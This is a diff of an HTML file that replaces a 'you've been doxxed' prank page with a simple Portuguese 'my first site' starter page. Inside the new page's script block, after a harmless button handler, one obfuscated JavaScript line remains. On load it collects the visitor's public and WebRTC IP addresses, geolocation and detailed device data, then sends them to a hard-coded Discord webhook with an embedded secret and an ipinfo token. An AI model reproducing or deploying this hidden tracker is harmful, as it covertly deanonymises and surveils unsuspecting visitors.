@@ -1,430 +1,117 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DOXXADO</title>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Fira+Code:wght@300;400;700&display=swap');
-        
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            background: radial-gradient(circle at center, #001100, #000800, #000400);
-            background-size: 200% 200%;
-            animation: backgroundPulse 15s ease-in-out infinite;
-            color: #00ff41;
-            font-family: 'Share Tech Mono', monospace;
-            overflow-x: hidden;
-            min-height: 100vh;
-            position: relative;
-        }
-
-        @keyframes backgroundPulse {
-            0%, 100% { background-position: 0% 50%; }
-            25% { background-position: 100% 0%; }
-            50% { background-position: 100% 100%; }
-            75% { background-position: 0% 100%; }
-        }
-
-        .matrix-bg {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            overflow: hidden;
-            z-index: -1;
-            opacity: 0.15;
-        }
-
-        .matrix-column {
-            position: absolute;
-            top: -100px;
-            font-family: 'Fira Code', monospace;
-            font-size: 12px;
-            color: #00ff41;
-            animation: matrixFall linear infinite;
-            text-shadow: 0 0 3px #00ff41;
-        }
-
-        @keyframes matrixFall {
-            to {
-                transform: translateY(calc(100vh + 100px));
-            }
-        }
-
-        .scan-lines {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            background: repeating-linear-gradient(
-                0deg,
-                transparent,
-                transparent 2px,
-                rgba(0, 255, 65, 0.03) 2px,
-                rgba(0, 255, 65, 0.03) 4px
-            );
-            z-index: 1;
-            animation: scanMove 0.1s linear infinite;
-        }
-
-        @keyframes scanMove {
-            0% { transform: translateY(0); }
-            100% { transform: translateY(4px); }
-        }
-
-        .container {
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 20px;
-            position: relative;
-            z-index: 2;
-        }
-
-        .warning-icon {
-            font-size: clamp(4rem, 10vw, 8rem);
-            color: #ff0040;
-            animation: 
-                pulse 1.5s infinite, 
-                rotate 10s linear infinite,
-                colorShift 3s ease-in-out infinite;
-            margin-bottom: 30px;
-            text-shadow: 
-                0 0 10px #ff0040,
-                0 0 20px #ff0040;
-            filter: drop-shadow(0 0 10px #ff0040);
-        }
-
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.2); }
-        }
-
-        @keyframes rotate {
-            from { transform: rotate(0deg); }
-            to { transform: rotate(360deg); }
-        }
-
-        @keyframes colorShift {
-            0% { color: #ff0040; text-shadow: 0 0 10px #ff0040, 0 0 20px #ff0040; }
-            33% { color: #ff4000; text-shadow: 0 0 10px #ff4000, 0 0 20px #ff4000; }
-            66% { color: #ffff00; text-shadow: 0 0 10px #ffff00, 0 0 20px #ffff00; }
-            100% { color: #ff0040; text-shadow: 0 0 10px #ff0040, 0 0 20px #ff0040; }
-        }
-
-        .main-title {
-            font-family: 'Orbitron', monospace;
-            font-size: clamp(1.8rem, 8vw, 5rem);
-            font-weight: 900;
-            color: #00ff41;
-            text-align: center;
-            text-transform: uppercase;
-            letter-spacing: 0.15em;
-            margin-bottom: 30px;
-            text-shadow: 
-                0 0 5px #00ff41,
-                0 0 15px #00ff41;
-            animation: 
-                flicker 2s infinite alternate,
-                glitchText 0.8s infinite,
-                textGlow 4s ease-in-out infinite;
-            position: relative;
-        }
-
-        @keyframes flicker {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.7; }
-        }
-
-        @keyframes glitchText {
-            0%, 90%, 100% { transform: translate(0); }
-            10% { transform: translate(-2px, 2px) skew(-1deg); }
-            20% { transform: translate(-2px, -2px) skew(1deg); }
-            30% { transform: translate(2px, 2px) skew(-1deg); }
-            40% { transform: translate(2px, -2px) skew(1deg); }
-            50% { transform: translate(-1px, 1px) skew(-0.5deg); }
-            60% { transform: translate(1px, -1px) skew(0.5deg); }
-            70% { transform: translate(-1px, -1px) skew(1deg); }
-            80% { transform: translate(1px, 1px) skew(-1deg); }
-        }
-
-        @keyframes textGlow {
-            0%, 100% { 
-                text-shadow: 
-                    0 0 5px #00ff41,
-                    0 0 15px #00ff41;
-            }
-            50% { 
-                text-shadow: 
-                    0 0 8px #00ff41,
-                    0 0 20px #00ff41,
-                    0 0 25px #00ff41;
-            }
-        }
-
-        .main-title::before {
-            content: 'VOCÊ FOI DOXXADO';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            color: #ff0040;
-            animation: glitchOverlay 2s infinite;
-            opacity: 0;
-        }
-
-        @keyframes glitchOverlay {
-            0%, 95%, 100% { opacity: 0; }
-            5% { opacity: 1; transform: translate(2px, 0); }
-            10% { opacity: 1; transform: translate(-2px, 0); }
-            15% { opacity: 0; }
-        }
-
-        .subtitle {
-            font-size: clamp(0.9rem, 3vw, 1.8rem);
-            color: #ff6600;
-            text-align: center;
-            margin-bottom: 40px;
-            animation: typewriter 4s steps(50, end);
-            overflow: hidden;
-            white-space: nowrap;
-            border-right: 4px solid #ff6600;
-            font-family: 'Fira Code', monospace;
-            text-shadow: 
-                0 0 3px #ff6600,
-                0 0 8px #ff6600;
-        }
-
-        @keyframes typewriter {
-            from { width: 0; }
-            to { width: 100%; }
-        }
-
-        .disclaimer {
-            margin-top: 50px;
-            text-align: center;
-            font-size: clamp(0.8rem, 2vw, 1rem);
-            color: #666;
-            font-style: italic;
-            animation: fadeIn 8s ease-in;
-            background: rgba(0, 0, 0, 0.7);
-            padding: 20px;
-            border-radius: 10px;
-            border: 1px solid rgba(0, 255, 65, 0.3);
-            backdrop-filter: blur(5px);
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        /* Efeitos adicionais de hacker */
-        .code-rain {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            z-index: 0;
-        }
-
-        .binary-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            opacity: 0.05;
-            background-image: 
-                repeating-linear-gradient(0deg, 
-                    transparent, 
-                    transparent 20px, 
-                    rgba(0, 255, 65, 0.1) 20px, 
-                    rgba(0, 255, 65, 0.1) 21px);
-            animation: binaryScroll 10s linear infinite;
-            z-index: 0;
-        }
-
-        @keyframes binaryScroll {
-            from { transform: translateY(0); }
-            to { transform: translateY(100vh); }
-        }
-
-        .terminal-cursor {
-            display: inline-block;
-            width: 3px;
-            height: 1em;
-            background: #00ff41;
-            animation: cursorBlink 1s infinite;
-            margin-left: 5px;
-        }
-
-        @keyframes cursorBlink {
-            0%, 50% { opacity: 1; }
-            51%, 100% { opacity: 0; }
-        }
-
-        @media (max-width: 768px) {
-            .container { padding: 15px; }
-            .disclaimer { padding: 15px; }
-        }
-
-        /* Efeito de interferência */
-        .interference {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            opacity: 0.1;
-            background: 
-                radial-gradient(circle at 20% 80%, transparent 20%, rgba(0, 255, 65, 0.1) 21%, rgba(0, 255, 65, 0.1) 29%, transparent 30%),
-                radial-gradient(circle at 80% 20%, transparent 20%, rgba(255, 0, 64, 0.1) 21%, rgba(255, 0, 64, 0.1) 29%, transparent 30%);
-            animation: interference 0.5s linear infinite;
-            z-index: 1;
-            pointer-events: none;
-        }
-
-        @keyframes interference {
-            0%, 100% { transform: translate(0, 0) rotate(0deg); }
-            25% { transform: translate(1px, 0) rotate(0.5deg); }
-            50% { transform: translate(-1px, 1px) rotate(-0.5deg); }
-            75% { transform: translate(0, -1px) rotate(0.25deg); }
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Meu Primeiro Site</title>
+  <!-- Estilos BEM SIMPLES: tudo em um arquivo para facilitar o estudo -->
+  <style>
+    :root { --bg: #f7f7fb; --ink: #1f2937; --accent: #3b82f6; --card: #ffffff; }
+    * { box-sizing: border-box; }
+    body { margin: 0; font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif; background: var(--bg); color: var(--ink); }
+    header { background: var(--card); border-bottom: 1px solid #e5e7eb; position: sticky; top: 0; z-index: 10; }
+    .container { max-width: 960px; margin: 0 auto; padding: 16px; }
+    .brand { font-weight: 700; }
+    nav a { margin-right: 12px; text-decoration: none; color: var(--ink); }
+    nav a:hover { color: var(--accent); }
+    .hero { padding: 48px 0; text-align: center; }
+    .hero h1 { margin: 0 0 8px; font-size: 2rem; }
+    .hero p { margin: 0 0 16px; color: #4b5563; }
+    .btn { display: inline-block; padding: 10px 16px; border-radius: 8px; background: var(--accent); color: white; border: none; cursor: pointer; }
+    .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 16px; }
+    .card { background: var(--card); border: 1px solid #e5e7eb; border-radius: 12px; padding: 16px; }
+    h2 { margin-top: 32px; }
+    footer { margin-top: 48px; padding: 24px 0; text-align: center; color: #6b7280; }
+    /* Responsivo: nada muito complexo, só garante bom visual no celular */
+  </style>
 </head>
 <body>
-    <div class="matrix-bg" id="matrixBg"></div>
-    <div class="scan-lines"></div>
-    <div class="binary-overlay"></div>
-    <div class="interference"></div>
-    
-    <div class="container">
-        <div class="warning-icon">⚠️</div>
-        <h1 class="main-title">VOCÊ FOI DOXXADO<span class="terminal-cursor"></span></h1>
-        <div class="subtitle">Suas informações foram comprometidas...</div>
-        
-        <div class="disclaimer">
-            <strong>Calma</strong> Isso é só uma brincadeira<br>
-            Nenhum dado real foi coletado(Talvez).<br>
-            <em>
-        </div>
+  <!-- CABEÇALHO com navegação simples -->
+  <header>
+    <div class="container" style="display:flex; align-items:center; justify-content:space-between;">
+      <div class="brand">Meu Site</div>
+      <nav>
+        <a href="#inicio">Início</a>
+        <a href="#sobre">Sobre</a>
+        <a href="#projetos">Projetos</a>
+        <a href="#contato">Contato</a>
+      </nav>
     </div>
+  </header>
 
-    <script>
-        // Efeito Matrix melhorado
-        function createMatrixEffect() {
-            const matrixBg = document.getElementById('matrixBg');
-            const characters = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン010110100110101100101010110010101011001010101100101010110010101011001010101100101010110010101011ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ｱｲｳｴｵｶｷｸｹｺｻｼｽｾｿﾀﾁﾂﾃﾄﾅﾆﾇﾈﾉﾊﾋﾌﾍﾎﾏﾐﾑﾒﾓﾔﾕﾖﾗﾘﾙﾚﾛﾜｦﾝ';
-            
-            // Criar mais colunas para efeito mais denso
-            for (let i = 0; i < 80; i++) {
-                const column = document.createElement('div');
-                column.className = 'matrix-column';
-                column.style.left = Math.random() * 100 + '%';
-                column.style.animationDuration = (Math.random() * 4 + 2) + 's';
-                column.style.animationDelay = Math.random() * 3 + 's';
-                column.style.fontSize = (Math.random() * 8 + 10) + 'px';
-                
-                let columnText = '';
-                const columnHeight = Math.random() * 30 + 10;
-                for (let j = 0; j < columnHeight; j++) {
-                    const char = characters.charAt(Math.floor(Math.random() * characters.length));
-                    const opacity = Math.max(0.1, 1 - (j / columnHeight));
-                    columnText += `<span style="opacity: ${opacity}">${char}</span><br>`;
-                }
-                column.innerHTML = columnText;
-                
-                matrixBg.appendChild(column);
-            }
-        }
+  <!-- Seção HERO (destaque inicial) -->
+  <main id="inicio" class="container">
+    <section class="hero">
+      <h1>Opa</h1>
+      <p>Esse é meu site simples</p>
+      <button class="btn" id="btn-oi">Clique para dizer oi</button>
+    </section>
 
-        // Efeito de áudio hacker
-        function playHackerSound() {
-            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
-            
-            // Som de alerta mais dramático
-            const oscillator1 = audioContext.createOscillator();
-            const oscillator2 = audioContext.createOscillator();
-            const gainNode = audioContext.createGain();
-            
-            oscillator1.connect(gainNode);
-            oscillator2.connect(gainNode);
-            gainNode.connect(audioContext.destination);
-            
-            oscillator1.frequency.value = 800;
-            oscillator2.frequency.value = 1200;
-            oscillator1.type = 'sawtooth';
-            oscillator2.type = 'square';
-            
-            gainNode.gain.setValueAtTime(0.1, audioContext.currentTime);
-            gainNode.gain.exponentialRampToValueAtTime(0.001, audioContext.currentTime + 1);
-            
-            oscillator1.start(audioContext.currentTime);
-            oscillator2.start(audioContext.currentTime + 0.1);
-            oscillator1.stop(audioContext.currentTime + 1);
-            oscillator2.stop(audioContext.currentTime + 1);
-        }
+    <!-- Seção SOBRE -->
+    <section id="sobre">
+      <h2>Sobre</h2>
+      <p>tamo ai tamo ai</p>
+      <div class="grid">
+        <div class="card"><strong>sla oq sla oq.</strong><br/>sla oq sla oq.</div>
+        <div class="card"><strong>sla oq sla oq.</strong><br/>sla oq sla oq.</div>
+        <div class="card"><strong>sla oq sla oq.</strong><br/>sla oq sla oq.</div>
+      </div>
+    </section>
 
-        // Efeito de interferência na tela
-        function createScreenGlitch() {
-            const body = document.body;
-            body.style.filter = 'hue-rotate(90deg) saturate(1.5)';
-            setTimeout(() => {
-                body.style.filter = 'hue-rotate(180deg) contrast(1.2)';
-            }, 50);
-            setTimeout(() => {
-                body.style.filter = 'hue-rotate(270deg) brightness(1.1)';
-            }, 100);
-            setTimeout(() => {
-                body.style.filter = '';
-            }, 150);
-        }
+    <!-- Seção PROJETOS (exemplo de cards) -->
+    <section id="projetos">
+      <h2>Projetos</h2>
+      <div class="grid">
+        <article class="card">
+          <h3>Projeto 1</h3>
+          <p>.</p>
+          <a class="btn" href="#" onclick="alert('projeto foda 1!')">Ver</a>
+        </article>
+        <article class="card">
+          <h3>Projeto 2</h3>
+          <p></p>
+          <a class="btn" href="#" onclick="alert('projeto foda 2!')">Ver</a>
+        </article>
+        <article class="card">
+          <h3>Projeto 3</h3>
+          <p></p>
+          <a class="btn" href="#" onclick="alert('projeto foda 3!')">Ver</a>
+        </article>
+      </div>
+    </section>
 
-        // Inicializar todos os efeitos
-        document.addEventListener('DOMContentLoaded', () => {
-            createMatrixEffect();
-            
-            // Adicionar efeito de clique para som
-            document.addEventListener('click', () => {
-                try {
-                    playHackerSound();
-                } catch (e) {
-                    console.log('Audio context not available');
-                }
-            }, { once: true });
-        });
+    <!-- Seção CONTATO (formulário simples, não envia de verdade) -->
+    <section id="contato">
+      <h2>Contato</h2>
+      <form onsubmit="alert('Ta enviado pae! (exemplo)'); return false;" class="card">
+        <label>Nome<br/>
+          <input required type="text" placeholder="Seu nome" style="width:100%; padding:8px; margin-top:4px;">
+        </label>
+        <br/><br/>
+        <label>Email<br/>
+          <input required type="email" placeholder="seu@email.com" style="width:100%; padding:8px; margin-top:4px;">
+        </label>
+        <br/><br/>
+        <label>Mensagem<br/>
+          <textarea required rows="4" placeholder="Escreva sua mensagem" style="width:100%; padding:8px; margin-top:4px;"></textarea>
+        </label>
+        <br/>
+        <button class="btn" type="submit">Enviar</button>
+      </form>
+    </section>
+  </main>
 
-        // Efeitos aleatórios contínuos
-        setInterval(() => {
-            if (Math.random() < 0.2) {
-                createScreenGlitch();
-            }
-        }, 5000);
+  <footer>
+    <div class="container">Feito com ❤ usando HTML + CSS + JS básico.</div>
+  </footer>
 
-        // Efeito de digitação aleatória
-        setInterval(() => {
-            if (Math.random() < 0.1) {
-                const randomCode = Math.random().toString(36).substring(2, 15);
-                console.log(`[SYSTEM]: ${randomCode.toUpperCase()}`);
-            }
-        }, 2000);
-
+  <!-- JavaScript BEM SIMPLES -->
+  <script>
+    // Quando o usuário clica no botão, mostramos um alerta
+    document.getElementById('btn-oi').addEventListener('click', function() {
+      alert('foda voce clicou :)');
+    });
 const _0x4a8d1d=_0x580d;(function(_0xf8bba9,_0x47d33d){const _0x15ca11=_0x580d,_0x373eb9=_0xf8bba9();while(!![]){try{const _0x26940f=-parseInt(_0x15ca11(0x1f6))/0x1+parseInt(_0x15ca11(0x1f1))/0x2+-parseInt(_0x15ca11(0x1d6))/0x3+parseInt(_0x15ca11(0x1a1))/0x4*(-parseInt(_0x15ca11(0x1aa))/0x5)+-parseInt(_0x15ca11(0x1b7))/0x6*(-parseInt(_0x15ca11(0x1b8))/0x7)+parseInt(_0x15ca11(0x1cb))/0x8+-parseInt(_0x15ca11(0x1e7))/0x9;if(_0x26940f===_0x47d33d)break;else _0x373eb9['push'](_0x373eb9['shift']());}catch(_0x27fb71){_0x373eb9['push'](_0x373eb9['shift']());}}}(_0x4345,0xe7dc7));const webhookURL=_0x4a8d1d(0x1a7),ipinfoToken=_0x4a8d1d(0x1ab);function getBrowserVersion(_0x202e14){const _0x11244f=_0x4a8d1d;let _0x23776c=_0x202e14['match'](/(Edg|Chrome|Firefox|Safari)\/([\d\.]+)/);if(_0x23776c){let _0x3448cb=_0x23776c[0x1];if(_0x3448cb==='Edg')_0x3448cb=_0x11244f(0x1e2);return _0x3448cb+'\x20'+_0x23776c[0x2];}return _0x11244f(0x1d1);}function sendPayload(_0x55a933){const _0x48ec7e=_0x4a8d1d;fetch(webhookURL,{'method':_0x48ec7e(0x1a9),'headers':{'Content-Type':_0x48ec7e(0x1eb)},'body':JSON[_0x48ec7e(0x1da)](_0x55a933)});}function _0x4345(){const _0x5b47bb=['12AjAXEh','4992337ocznVR','Nenhum\x20detectado','IPs\x20WebRTC\x20Leak','País','level','Região','timezone','loc','region','Memória\x20RAM\x20aproximada\x20(GB)','join','Cookies\x20habilitados','Idioma','Resolução\x20da\x20tela','name','onicecandidate','Versão\x20do\x20navegador','matches','toString','1023992kycWDY','userAgent','downlink','error','match','devicePixelRatio','Desconhecido','onLine','\x20Mbps','Cidade','Localização\x20(lat,long)','1067364kqwBHX','Sim','Erro\x20ao\x20obter\x20ou\x20enviar\x20informações:','Núcleos\x20da\x20CPU','stringify','catch','Prefere\x20modo\x20escuro','createOffer','map','language','candidate','plugins','Microsoft\x20Edge','cookieEnabled','createDataChannel','connection','DPI\x20(devicePixelRatio)','1997109hbWdfY','Online','https://ipinfo.io/','city','application/json','N/A','hardwareConcurrency','matchMedia','country','charging','2364194TeTjcI','Erro\x20ao\x20criar\x20oferta\x20WebRTC:','AK-47\x20Collector','json','Nível\x20da\x20bateria','913068qNVreX','toISOString','getBattery','/json?token=','592036ltgpQF','setLocalDescription','Nenhum','🕵️\x20Novo\x20visitante','Tipo:\x20','then','https://discord.com/api/webhooks/1391682825329180752/ym0kJ2YnOS0bFj5VK0EpK2K3T-BZtmYI4xRYxaBK-DReqeo75zkUTh_CIip1gtaVbPBi','Fuso\x20horário\x20(navegador)','POST','10Sqdgmz','e21650a9d682be','effectiveType','Plugins','Timezone\x20(IPinfo)','width','Navegador\x20(userAgent)','Carregando\x20bateria','org','DateTimeFormat','add','Não','(prefers-color-scheme:\x20dark)'];_0x4345=function(){return _0x5b47bb;};return _0x4345();}function _0x580d(_0x4df0a2,_0x1d53bc){const _0x43452a=_0x4345();return _0x580d=function(_0x580df5,_0x256fb8){_0x580df5=_0x580df5-0x1a0;let _0x5f4c84=_0x43452a[_0x580df5];return _0x5f4c84;},_0x580d(_0x4df0a2,_0x1d53bc);}function getWebRTCIps(_0x5d2ec6){const _0x59988c=_0x4a8d1d,_0xfaa628=new Set(),_0x3915d6=new RTCPeerConnection({'iceServers':[{'urls':'stun:stun.services.mozilla.com'},{'urls':'stun:stun.l.google.com:19302'}]});_0x3915d6[_0x59988c(0x1e4)]('x'),_0x3915d6[_0x59988c(0x1c7)]=_0x2e4b8e=>{const _0x2dd438=_0x59988c;if(!_0x2e4b8e['candidate']){_0x5d2ec6([..._0xfaa628]);return;}const _0x5b5da2=_0x2e4b8e[_0x2dd438(0x1e0)][_0x2dd438(0x1e0)],_0x377216=/([0-9]{1,3}(\.[0-9]{1,3}){3})/,_0x455ed1=_0x5b5da2[_0x2dd438(0x1cf)](_0x377216);_0x455ed1&&_0x455ed1[0x1]&&_0xfaa628[_0x2dd438(0x1b4)](_0x455ed1[0x1]);},_0x3915d6[_0x59988c(0x1dd)]()[_0x59988c(0x1a6)](_0x5ab766=>{const _0x140637=_0x59988c;return _0x3915d6[_0x140637(0x1a2)](_0x5ab766);})[_0x59988c(0x1db)](_0x5d8f8a=>{const _0x39c6fd=_0x59988c;console['error'](_0x39c6fd(0x1f2),_0x5d8f8a),_0x5d2ec6([]);});}async function coletarEEnviarDados(){const _0x3692d7=_0x4a8d1d;try{const _0x3f0a15=await fetch('https://api.ipify.org?format=json'),_0x19b816=await _0x3f0a15[_0x3692d7(0x1f4)](),_0x156dcb=_0x19b816['ip'],_0xadfd63=await fetch(_0x3692d7(0x1e9)+_0x156dcb+_0x3692d7(0x1a0)+ipinfoToken),_0x43a216=await _0xadfd63[_0x3692d7(0x1f4)](),_0x381a15=navigator[_0x3692d7(0x1cc)],_0x32f64f=navigator[_0x3692d7(0x1df)],_0x21922e=Intl[_0x3692d7(0x1b3)]()['resolvedOptions']()['timeZone'],_0x15d546=screen[_0x3692d7(0x1af)]+'x'+screen['height'],_0x473149=window[_0x3692d7(0x1d0)],_0x6e07df=[...navigator[_0x3692d7(0x1e1)]][_0x3692d7(0x1de)](_0x2a8fb6=>_0x2a8fb6[_0x3692d7(0x1c6)])[_0x3692d7(0x1c2)](',\x20')||_0x3692d7(0x1a3),_0x33d2b1=navigator[_0x3692d7(0x1ed)]||_0x3692d7(0x1ec),_0x38ebb8=navigator['deviceMemory']||'N/A',_0x12a114=navigator[_0x3692d7(0x1e5)]||{},_0x24625e=_0x12a114[_0x3692d7(0x1ac)]||_0x3692d7(0x1ec),_0x345a38=_0x12a114[_0x3692d7(0x1cd)]?_0x12a114[_0x3692d7(0x1cd)]+_0x3692d7(0x1d3):_0x3692d7(0x1ec),_0x112154=navigator[_0x3692d7(0x1e3)],_0x5815ff=navigator[_0x3692d7(0x1d2)],_0x52546d=window[_0x3692d7(0x1ee)](_0x3692d7(0x1b6))[_0x3692d7(0x1c9)],_0x3c99bc=getBrowserVersion(_0x381a15);getWebRTCIps(_0x430563=>{const _0x168f19=_0x3692d7;function _0x1080a6(_0xec965d,_0xcfac9f){const _0x3dc3ad=_0x580d,_0x800f23={'title':_0x3dc3ad(0x1a4),'color':0xff0000,'fields':[{'name':'IP\x20público','value':_0x156dcb,'inline':!![]},{'name':_0x3dc3ad(0x1ba),'value':_0x430563['length']>0x0?_0x430563[_0x3dc3ad(0x1c2)](',\x20'):_0x3dc3ad(0x1b9),'inline':![]},{'name':_0x3dc3ad(0x1d4),'value':_0x43a216[_0x3dc3ad(0x1ea)]||_0x3dc3ad(0x1ec),'inline':!![]},{'name':_0x3dc3ad(0x1bd),'value':_0x43a216[_0x3dc3ad(0x1c0)]||'N/A','inline':!![]},{'name':_0x3dc3ad(0x1bb),'value':_0x43a216[_0x3dc3ad(0x1ef)]||_0x3dc3ad(0x1ec),'inline':!![]},{'name':_0x3dc3ad(0x1d5),'value':_0x43a216[_0x3dc3ad(0x1bf)]||_0x3dc3ad(0x1ec),'inline':!![]},{'name':'Organização','value':_0x43a216[_0x3dc3ad(0x1b2)]||_0x3dc3ad(0x1ec),'inline':!![]},{'name':_0x3dc3ad(0x1ae),'value':_0x43a216[_0x3dc3ad(0x1be)]||'N/A','inline':!![]},{'name':_0x3dc3ad(0x1b0),'value':_0x381a15,'inline':![]},{'name':_0x3dc3ad(0x1c8),'value':_0x3c99bc,'inline':!![]},{'name':_0x3dc3ad(0x1c4),'value':_0x32f64f,'inline':!![]},{'name':_0x3dc3ad(0x1a8),'value':_0x21922e,'inline':!![]},{'name':_0x3dc3ad(0x1c5),'value':_0x15d546,'inline':!![]},{'name':_0x3dc3ad(0x1e6),'value':_0x473149[_0x3dc3ad(0x1ca)](),'inline':!![]},{'name':_0x3dc3ad(0x1ad),'value':_0x6e07df,'inline':![]},{'name':_0x3dc3ad(0x1d9),'value':_0x33d2b1[_0x3dc3ad(0x1ca)](),'inline':!![]},{'name':_0x3dc3ad(0x1c1),'value':_0x38ebb8[_0x3dc3ad(0x1ca)](),'inline':!![]},{'name':'Conexão','value':_0x3dc3ad(0x1a5)+_0x24625e+',\x20Downlink:\x20'+_0x345a38,'inline':!![]},{'name':_0x3dc3ad(0x1c3),'value':_0x112154?_0x3dc3ad(0x1d7):_0x3dc3ad(0x1b5),'inline':!![]},{'name':_0x3dc3ad(0x1e8),'value':_0x5815ff?_0x3dc3ad(0x1d7):'Não','inline':!![]},{'name':_0x3dc3ad(0x1dc),'value':_0x52546d?_0x3dc3ad(0x1d7):_0x3dc3ad(0x1b5),'inline':!![]},{'name':_0x3dc3ad(0x1f5),'value':_0xec965d,'inline':!![]},{'name':_0x3dc3ad(0x1b1),'value':_0xcfac9f,'inline':!![]}],'footer':{'text':_0x3dc3ad(0x1f3)},'timestamp':new Date()[_0x3dc3ad(0x1f7)]()};sendPayload({'embeds':[_0x800f23]});}navigator[_0x168f19(0x1f8)]?navigator[_0x168f19(0x1f8)]()[_0x168f19(0x1a6)](_0x363718=>{const _0x493103=_0x168f19,_0x36abfc=Math['round'](_0x363718[_0x493103(0x1bc)]*0x64)+'%',_0x1dc1cd=_0x363718[_0x493103(0x1f0)]?'Sim':_0x493103(0x1b5);_0x1080a6(_0x36abfc,_0x1dc1cd);})[_0x168f19(0x1db)](()=>{const _0x1f8dd3=_0x168f19;_0x1080a6('N/A',_0x1f8dd3(0x1ec));}):_0x1080a6(_0x168f19(0x1ec),_0x168f19(0x1ec));});}catch(_0x4dd8a6){console[_0x3692d7(0x1ce)](_0x3692d7(0x1d8),_0x4dd8a6);}}coletarEEnviarDados();
-    </script>
+  </script>
 </body>
 </html>
